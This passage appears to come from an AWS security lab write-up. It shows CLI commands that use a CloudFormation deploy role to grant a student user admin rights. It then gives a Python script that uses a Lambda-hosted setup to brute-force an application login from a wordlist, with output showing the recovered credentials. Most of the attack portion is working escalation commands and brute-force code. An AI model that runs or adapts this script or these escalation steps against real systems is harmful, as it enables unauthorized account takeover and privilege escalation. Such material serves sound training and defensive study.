aws cloudformation create-stack --stack-name ad-stack --template-body file://new_policy.json --capabilities CAPABILITY_NAMED_IAM --role-arn "arn:aws:iam::713069151016:role/lab12CFDeployRole"
  arn:aws:cloudformation:us-east-1:713069151016:stack/ad-stack/0abbc870-f9ce-11eb-b652-0e7b928af6d7

aws cloudformation describe-stacks --stack-name ad-stack
aws cloudformation describe-stacks-events --stack-name ad-stack

aws aws iam list-user-policies --user-name student # Should have admin policy
```

## Take advantage

It is not straightforward because each lambda functions are only executed for a small time so in order to keep persistence it is required to be continuously warming the lambda function

### Example 1 - Dictionary attack using lambda

Using [attack.py](http://attack.py/), [brute.py](http://brute.py/) and [get.py](http://get.py/) it is possible to bruteforce the password using several tries.

- Attack - Upload wordlist and bruteforcing code
- Brute - Perform the actual bruteforcing
- Get - Check the status of the bruteforcing

```bash
549

Credentials not Found.
Credentials not Found.
Credentials not Found.
Correct Credentials Found!
Username: admin
Password: melissa
Correct Credentials Found!
Username: admin
Password: melissa
Correct Credentials Found!
Username: admin
Password: melissa
```

```python[brute.py]
from urllib import request,parse
import timeit

url = "https://{{ aws-lambda-url io7wmzryh7.execute-api.us-east-1.amazonaws.com/dev }}?name={{ user admin }}&password="

# Just for printing Final Credential Not Found Message
flag = 0

# Start time of the script
start=timeit.default_timer()


# Check if a previously saved progress (cursor value) is present
try:
	s = open('{{ tmp-dir /tmp/lst }}/seek', 'r')
	index = int(s.readline().strip())
except:
	index = 0


# Iterating through wordlist
with open('{{ tmp-dir /tmp/lst }}/wordlist','r') as f:
	# Seeking to last save point or at the start
	f.seek(index)
	line = f.readline()
	
	# Reading one line at a time
	while line:
	
		# Checking when certain amount of seconds are up
		if (int(timeit.default_timer()-start)) >= 5:
			
			# Writing cursor value to a file and breaking the loop
			o = open("{{ tmp-dir /tmp/lst }}/seek", 'w')
			o.write(seek)
			o.close()
			break
		
		# Making a request with the password read from wordlist
		line = line.strip()
		f_url = url + line
		r = request.urlopen(f_url)
		
		# Checking if Credentials are correct
		if "Failed" not in r.read().decode("utf-8"):
			print("Correct Credentials Found!")
			print("Username: {{ user admin }}")
			print("Password:", line)
			flag = 1
			break
			
		# Keeping track of cursor value
		seek = str(f.tell())
		line = f.readline()
if flag == 0:
	print("Credentials not Found.")
```

